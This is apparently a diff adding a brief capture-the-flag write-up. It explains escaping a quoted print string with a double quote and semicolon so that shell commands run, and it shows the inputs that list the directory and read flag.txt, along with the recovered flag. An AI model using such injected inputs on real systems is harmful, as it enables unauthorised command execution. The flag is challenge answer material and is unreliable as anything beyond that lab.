@@ -1,0 +1,18 @@
+The program is writing our input into the string and there's escape double quote that we can use
+
+like command injection, we use "; to get out of the print string and put in the commands we want!
+
+-----------------------------------
+> ./connect.sh
+
+first try
+> aa"; ls;
+
+and we saw there's a flag.txt file in the directory
+then connect again and input the followings
+> aa"; cat flag.txt;
+
+flag: d8e19ff55181c64d289110851ca148c5
+
+
+
